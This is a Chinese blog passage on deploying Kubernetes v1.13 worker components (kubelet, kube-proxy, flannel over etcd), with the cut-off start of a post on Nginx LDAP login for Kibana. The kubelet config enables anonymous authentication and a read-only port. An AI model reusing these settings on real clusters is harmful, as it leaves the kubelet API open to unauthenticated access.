<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vim /k8s/kubernetes/cfg/kubelet.config</span><br><span class="line">kind: KubeletConfiguration</span><br><span class="line">apiVersion: kubelet.config.k8s.io/v1beta1</span><br><span class="line">address: 10.2.8.65</span><br><span class="line">port: 10250</span><br><span class="line">readOnlyPort: 10255</span><br><span class="line">cgroupDriver: cgroupfs</span><br><span class="line">clusterDNS: [&quot;10.254.0.10&quot;]</span><br><span class="line">clusterDomain: cluster.local.</span><br><span class="line">failSwapOn: false</span><br><span class="line">authentication:</span><br><span class="line">  anonymous:</span><br><span class="line">    enabled: true</span><br></pre></td></tr></table></figure>

<p>5）创建kubelet配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vim /k8s/kubernetes/cfg/kubelet</span><br><span class="line"></span><br><span class="line">KUBELET_OPTS=&quot;--logtostderr=true \</span><br><span class="line">--v=4 \</span><br><span class="line">--hostname-override=10.2.8.65 \</span><br><span class="line">--kubeconfig=/k8s/kubernetes/cfg/kubelet.kubeconfig \</span><br><span class="line">--bootstrap-kubeconfig=/k8s/kubernetes/cfg/bootstrap.kubeconfig \</span><br><span class="line">--config=/k8s/kubernetes/cfg/kubelet.config \</span><br><span class="line">--cert-dir=/k8s/kubernetes/ssl \</span><br><span class="line">--pod-infra-container-image=registry.cn-hangzhou.aliyuncs.com/google-containers/pause-amd64:3.0&quot;</span><br></pre></td></tr></table></figure>

<p>6）创建kubelet systemd文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/lib/systemd/system/kubelet.service </span><br><span class="line"></span><br><span class="line">[Unit]</span><br><span class="line">Description=Kubernetes Kubelet</span><br><span class="line">After=docker.service</span><br><span class="line">Requires=docker.service</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">EnvironmentFile=/k8s/kubernetes/cfg/kubelet</span><br><span class="line">ExecStart=/k8s/kubernetes/bin/kubelet $KUBELET_OPTS</span><br><span class="line">Restart=on-failure</span><br><span class="line">KillMode=process</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>

<p>7）将kubelet-bootstrap用户绑定到系统集群角色</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kubectl create clusterrolebinding kubelet-bootstrap \</span><br><span class="line">  --clusterrole=system:node-bootstrapper \</span><br><span class="line">  --user=kubelet-bootstrap</span><br></pre></td></tr></table></figure>

<p>注意这个默认连接localhost:8080端口，可以在master上操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@elasticsearch01 ssl]# kubectl create clusterrolebinding kubelet-bootstrap \</span><br><span class="line">&gt;   --clusterrole=system:node-bootstrapper \</span><br><span class="line">&gt;   --user=kubelet-bootstrap</span><br><span class="line">clusterrolebinding.rbac.authorization.k8s.io/kubelet-bootstrap created</span><br></pre></td></tr></table></figure>

<p>8）启动服务 systemctl daemon-reload systemctl enable kubelet systemctl start kubelet</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@elasticsearch02 cfg]# systemctl status kubelet</span><br><span class="line">● kubelet.service - Kubernetes Kubelet</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/kubelet.service; enabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since Thu 2018-12-27 17:34:30 CST; 18s ago</span><br><span class="line"> Main PID: 24676 (kubelet)</span><br><span class="line">   Memory: 88.6M</span><br><span class="line">   CGroup: /system.slice/kubelet.service</span><br><span class="line">           └─24676 /k8s/kubernetes/bin/kubelet --logtostderr=true --v=4 --hostname-override=10.2.8.44 --kubeconfig=/k8s/kubernetes...</span><br></pre></td></tr></table></figure>

<p>9）Master接受kubelet CSR请求 可以手动或自动 approve CSR 请求。推荐使用自动的方式，因为从 v1.8 版本开始，可以自动轮转approve csr 后生成的证书，如下是手动 approve CSR请求操作方法 查看CSR列表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@elasticsearch01 ssl]# kubectl get csr</span><br><span class="line">NAME                                                   AGE    REQUESTOR           CONDITION</span><br><span class="line">node-csr-ij3py9j-yi-eoa8sOHMDs7VeTQtMv0N3Efj3ByZLMdc   102s   kubelet-bootstrap   Pending</span><br></pre></td></tr></table></figure>

<p>接受node</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@elasticsearch01 ssl]# kubectl certificate approve node-csr-ij3py9j-yi-eoa8sOHMDs7VeTQtMv0N3Efj3ByZLMdc</span><br><span class="line">certificatesigningrequest.certificates.k8s.io/node-csr-ij3py9j-yi-eoa8sOHMDs7VeTQtMv0N3Efj3ByZLMdc approved</span><br></pre></td></tr></table></figure>

<p>再查看CSR</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@elasticsearch01 ssl]# kubectl get csr</span><br><span class="line">NAME                                                   AGE     REQUESTOR           CONDITION</span><br><span class="line">node-csr-ij3py9j-yi-eoa8sOHMDs7VeTQtMv0N3Efj3ByZLMdc   5m13s   kubelet-bootstrap   Approved,Issued</span><br></pre></td></tr></table></figure>

<h5 id="5-3部署kube-proxy组件"><a href="#5-3部署kube-proxy组件" class="headerlink" title="5.3部署kube-proxy组件"></a>5.3部署kube-proxy组件</h5><p>kube-proxy 运行在所有 node节点上，它监听 apiserver 中 service 和 Endpoint 的变化情况，创建路由规则来进行服务负载均衡 1）创建 kube-proxy 配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim /k8s/kubernetes/cfg/kube-proxy</span><br><span class="line">KUBE_PROXY_OPTS=&quot;--logtostderr=true \</span><br><span class="line">--v=4 \</span><br><span class="line">--hostname-override=10.2.8.65 \</span><br><span class="line">--cluster-cidr=10.254.0.0/16 \</span><br><span class="line">--kubeconfig=/k8s/kubernetes/cfg/kube-proxy.kubeconfig&quot;</span><br></pre></td></tr></table></figure>

<p>2）创建kube-proxy systemd文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/lib/systemd/system/kube-proxy.service </span><br><span class="line"></span><br><span class="line">[Unit]</span><br><span class="line">Description=Kubernetes Proxy</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">EnvironmentFile=-/k8s/kubernetes/cfg/kube-proxy</span><br><span class="line">ExecStart=/k8s/kubernetes/bin/kube-proxy $KUBE_PROXY_OPTS</span><br><span class="line">Restart=on-failure</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>

<p>3）启动服务</p>
<p>systemctl daemon-reload systemctl enable kube-proxy systemctl start kube-proxy</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@elasticsearch02 cfg]# systemctl status  kube-proxy</span><br><span class="line">● kube-proxy.service - Kubernetes Proxy</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/kube-proxy.service; enabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since Thu 2018-12-27 18:31:42 CST; 11s ago</span><br><span class="line"> Main PID: 5376 (kube-proxy)</span><br><span class="line">   Memory: 40.9M</span><br><span class="line">   CGroup: /system.slice/kube-proxy.service</span><br><span class="line">           ‣ 5376 /k8s/kubernetes/bin/kube-proxy --logtostderr=true --v=4 --hostname-override=10.2.8.44 --cluster-cidr=10.254.0.0/...</span><br></pre></td></tr></table></figure>

<p>4）查看集群状态</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@elasticsearch01 cfg]# kubectl get nodes</span><br><span class="line">NAME        STATUS   ROLES    AGE     VERSION</span><br><span class="line">10.2.8.65   Ready    &lt;none&gt;   9m15s   v1.13.1</span><br></pre></td></tr></table></figure>

<p>5）同样操作部署node 10.2.8.34并认证csr，认证后会生成kubelet-client证书</p>
<blockquote>
<p>注意期间要是kubelet，kube-proxy配置错误，比如监听IP或者hostname错误导致node not found，需要删除kubelet-client证书，重启kubelet服务，重启认证csr即可</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@elasticsearch03 kubernetes]# ls ssl</span><br><span class="line">ca-key.pem  kubelet-client-2018-12-27-20-13-52.pem  kubelet.crt  kube-proxy-key.pem  server-key.pem</span><br><span class="line">ca.pem      kubelet-client-current.pem              kubelet.key  kube-proxy.pem      server.pem</span><br><span class="line"></span><br><span class="line">[root@elasticsearch01 ~]# kubectl get nodes</span><br><span class="line">NAME        STATUS   ROLES    AGE   VERSION</span><br><span class="line">10.2.8.34   Ready    &lt;none&gt;   13h   v1.13.1</span><br><span class="line">10.2.8.65   Ready    &lt;none&gt;   14h   v1.13.1</span><br></pre></td></tr></table></figure>

<h3 id="六-Flanneld网络部署"><a href="#六-Flanneld网络部署" class="headerlink" title="六 Flanneld网络部署"></a><strong>六 Flanneld网络部署</strong></h3><blockquote>
<p>默认没有flanneld网络，Node节点间的pod不能通信，只能Node内通信，为了部署步骤简洁明了，故flanneld放在后面安装 flannel服务需要先于docker启动。flannel服务启动时主要做了以下几步的工作： 从etcd中获取network的配置信息 划分subnet，并在etcd中进行注册 将子网信息记录到&#x2F;run&#x2F;flannel&#x2F;subnet.env中</p>
</blockquote>
<h5 id="6-1-etcd注册网段"><a href="#6-1-etcd注册网段" class="headerlink" title="6.1 etcd注册网段"></a>6.1 etcd注册网段</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@elasticsearch02 cfg]# /k8s/etcd/bin/etcdctl --ca-file=/k8s/etcd/ssl/ca.pem --cert-file=/k8s/etcd/ssl/server.pem --key-file=/k8s/etcd/ssl/server-key.pem --endpoints=&quot;https://10.2.8.44:2379,https://10.2.8.65:2379,https://10.2.8.34:2379&quot;  set /k8s/network/config  &#x27;&#123; &quot;Network&quot;: &quot;10.254.0.0/16&quot;, &quot;Backend&quot;: &#123;&quot;Type&quot;: &quot;vxlan&quot;&#125;&#125;&#x27;</span><br><span class="line">&#123; &quot;Network&quot;: &quot;10.254.0.0/16&quot;, &quot;Backend&quot;: &#123;&quot;Type&quot;: &quot;vxlan&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>flanneld 当前版本 (v0.10.0) 不支持 etcd v3，故使用 etcd v2 API 写入配置 key 和网段数据； 写入的 Pod 网段 ${CLUSTER_CIDR} 必须是 &#x2F;16 段地址，必须与 kube-controller-manager 的 –cluster-cidr 参数值一致；</p>
<h4 id="6-2-flannel安装"><a href="#6-2-flannel安装" class="headerlink" title="6.2 flannel安装"></a>6.2 flannel安装</h4><p>1）解压安装</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf flannel-v0.10.0-linux-amd64.tar.gz</span><br><span class="line">mv flanneld mk-docker-opts.sh /k8s/kubernetes/bin/</span><br></pre></td></tr></table></figure>

<p>2）配置flanneld</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /k8s/kubernetes/cfg/flanneld</span><br><span class="line">FLANNEL_OPTIONS=&quot;--etcd-endpoints=https://10.2.8.44:2379,https://10.2.8.65:2379,https://10.2.8.34:2379 -etcd-cafile=/k8s/etcd/ssl/ca.pem -etcd-certfile=/k8s/etcd/ssl/server.pem -etcd-keyfile=/k8s/etcd/ssl/server-key.pem -etcd-prefix=/k8s/network&quot;</span><br></pre></td></tr></table></figure>

<p>创建flanneld systemd文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/lib/systemd/system/flanneld.service</span><br><span class="line">[Unit]</span><br><span class="line">Description=Flanneld overlay address etcd agent</span><br><span class="line">After=network-online.target network.target</span><br><span class="line">Before=docker.service</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=notify</span><br><span class="line">EnvironmentFile=/k8s/kubernetes/cfg/flanneld</span><br><span class="line">ExecStart=/k8s/kubernetes/bin/flanneld --ip-masq $FLANNEL_OPTIONS</span><br><span class="line">ExecStartPost=/k8s/kubernetes/bin/mk-docker-opts.sh -k DOCKER_NETWORK_OPTIONS -d /run/flannel/subnet.env</span><br><span class="line">Restart=on-failure</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>

<p>注意</p>
<blockquote>
<p>mk-docker-opts.sh 脚本将分配给 flanneld 的 Pod 子网网段信息写入 &#x2F;run&#x2F;flannel&#x2F;docker 文件，后续 docker 启动时 使用这个文件中的环境变量配置 docker0 网桥； flanneld 使用系统缺省路由所在的接口与其它节点通信，对于有多个网络接口（如内网和公网）的节点，可以用 -iface 参数指定通信接口; flanneld 运行时需要 root 权限；</p>
</blockquote>
<p>3）配置Docker启动指定子网 修改EnvironmentFile&#x3D;&#x2F;run&#x2F;flannel&#x2F;subnet.env，ExecStart&#x3D;&#x2F;usr&#x2F;bin&#x2F;dockerd $DOCKER_NETWORK_OPTIONS即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/lib/systemd/system/docker.service </span><br><span class="line">[Unit]</span><br><span class="line">Description=Docker Application Container Engine</span><br><span class="line">Documentation=https://docs.docker.com</span><br><span class="line">After=network-online.target firewalld.service</span><br><span class="line">Wants=network-online.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=notify</span><br><span class="line">EnvironmentFile=/run/flannel/subnet.env</span><br><span class="line">ExecStart=/usr/bin/dockerd $DOCKER_NETWORK_OPTIONS</span><br><span class="line">ExecReload=/bin/kill -s HUP $MAINPID</span><br><span class="line">LimitNOFILE=infinity</span><br><span class="line">LimitNPROC=infinity</span><br><span class="line">LimitCORE=infinity</span><br><span class="line">TimeoutStartSec=0</span><br><span class="line">Delegate=yes</span><br><span class="line">KillMode=process</span><br><span class="line">Restart=on-failure</span><br><span class="line">StartLimitBurst=3</span><br><span class="line">StartLimitInterval=60s</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>

<p>4）启动服务 注意启动flannel前要关闭docker及相关的kubelet这样flannel才会覆盖docker0网桥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl stop docker</span><br><span class="line">systemctl start flanneld</span><br><span class="line">systemctl enable flanneld</span><br><span class="line">systemctl start docker</span><br><span class="line">systemctl restart kubelet</span><br><span class="line">systemctl restart kube-proxy</span><br></pre></td></tr></table></figure>

<p>5）验证服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@elasticsearch02 bin]# cat /run/flannel/subnet.env </span><br><span class="line">DOCKER_OPT_BIP=&quot;--bip=10.254.35.1/24&quot;</span><br><span class="line">DOCKER_OPT_IPMASQ=&quot;--ip-masq=false&quot;</span><br><span class="line">DOCKER_OPT_MTU=&quot;--mtu=1450&quot;</span><br><span class="line">DOCKER_NETWORK_OPTIONS=&quot; --bip=10.254.35.1/24 --ip-masq=false --mtu=1450&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@elasticsearch02 bin]# ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN qlen 1</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP qlen 1000</span><br><span class="line">    link/ether 52:54:00:a4:ca:ff brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.2.8.65/24 brd 10.2.8.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN </span><br><span class="line">    link/ether 02:42:06:0a:ab:32 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.254.35.1/24 brd 10.254.35.255 scope global docker0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">4: flannel.1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue state UNKNOWN </span><br><span class="line">    link/ether 72:59:dc:2b:0a:21 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.254.35.0/32 scope global flannel.1</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@elasticsearch01 k8s]# kubectl get nodes</span><br><span class="line">NAME        STATUS   ROLES    AGE    VERSION</span><br><span class="line">10.2.8.34   Ready    &lt;none&gt;   16h    v1.13.1</span><br><span class="line">10.2.8.65   Ready    &lt;none&gt;   18h    v1.13.1</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://minminmsn.github.io/2018/12/24/2018/12/2018-12-24-nginx-%E7%BB%93%E5%90%88python-ldap%E8%AE%A4%E8%AF%81%E7%94%A8%E4%BA%8Ekibana%E6%9D%83%E9%99%90%E7%99%BB%E9%99%86/index/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Jerry Min">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="MinMinMsn">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2018/12/24/2018/12/2018-12-24-nginx-%E7%BB%93%E5%90%88python-ldap%E8%AE%A4%E8%AF%81%E7%94%A8%E4%BA%8Ekibana%E6%9D%83%E9%99%90%E7%99%BB%E9%99%86/index/" class="post-title-link" itemprop="url">Nginx 结合Python Ldap认证用于Kibana权限登陆</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2018-12-24 08:00:00" itemprop="dateCreated datePublished" datetime="2018-12-24T08:00:00+08:00">2018-12-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-05-26 15:06:30" itemprop="dateModified" datetime="2023-05-26T15:06:30+08:00">2023-05-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/middleware/" itemprop="url" rel="index"><span itemprop="name">middleware</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/middleware/dev/" itemprop="url" rel="index"><span itemprop="name">dev</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<h3 id="参考及依赖"><a href="#参考及依赖" class="headerlink" title="参考及依赖"></a><strong>参考及依赖</strong></h3></blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/nginxinc/nginx-ldap-auth</span><br><span class="line">http://nginx.org/</span><br><span class="line">nginx-1.14.2</span><br><span class="line">http_auth_request_module</span><br><span class="line">nginx-ldap-auth</span><br><span class="line">python2.7</span><br><span class="line">python-ldap</span><br></pre></td></tr></table></figure>

<blockquote>
<h3 id="Nginx支持ldap"><a href="#Nginx支持ldap" class="headerlink" title="Nginx支持ldap"></a><strong>Nginx支持ldap</strong></h3></blockquote>
<ol>
<li>部署nginx，注意需要http_auth_request_module支持</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget http://nginx.org/download/nginx-1.14.2.tar.gz</span><br><span class="line">tar zxvf nginx-1.14.2.tar.gz</span><br><span class="line">cd nginx-1.14.2</span><br><span class="line">./configure --with-http_auth_request_module</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line">/usr/local/nginx/sbin/nginx</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>配置nginx,注意ldap配置 cat &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">user                  nobody nobody;</span><br><span class="line">worker_processes auto;</span><br><span class="line">#worker_cpu_affinity auto;</span><br><span class="line">worker_rlimit_nofile 65535;</span><br><span class="line"></span><br><span class="line">error_log             logs/error.log;</span><br><span class="line">pid                   logs/nginx.pid;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    use epoll;</span><br><span class="line">    #reuse_port on;   #used in tengine and linux kernel &gt;= 3.9</span><br><span class="line">    accept_mutex off;  #used in nginx</span><br><span class="line">    worker_connections  65535;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include                     mime.types;</span><br><span class="line">    default_type                application/octet-stream;</span><br><span class="line">    server_tokens               off;</span><br><span class="line"></span><br><span class="line">    log_format      main        &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span><br><span class="line">                                &#x27;$status $request_time $body_bytes_sent &quot;$http_referer&quot; &#x27;</span><br><span class="line">                                &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;|body: $request_body&#x27;;</span><br><span class="line"></span><br><span class="line">    sendfile                    on;</span><br><span class="line">    tcp_nopush                  on;</span><br><span class="line">    tcp_nodelay                 on;</span><br><span class="line">    keepalive_timeout           60;</span><br><span class="line"></span><br><span class="line">    gzip                        on;</span><br><span class="line">    gzip_vary                   on;</span><br><span class="line">    gzip_comp_level             5;</span><br><span class="line">    gzip_buffers                16 4k;</span><br><span class="line">    gzip_min_length             1000;</span><br><span class="line">    gzip_proxied                any;</span><br><span class="line">    gzip_disable                &quot;msie6&quot;;</span><br><span class="line">    gzip_types                  text/plain text/css application/x-javascript text/xml application/xml application/xml+rss text/javascript application/javascript application/json;</span><br><span class="line"></span><br><span class="line">    open_file_cache max=1000    inactive=20s;</span><br><span class="line">    open_file_cache_valid       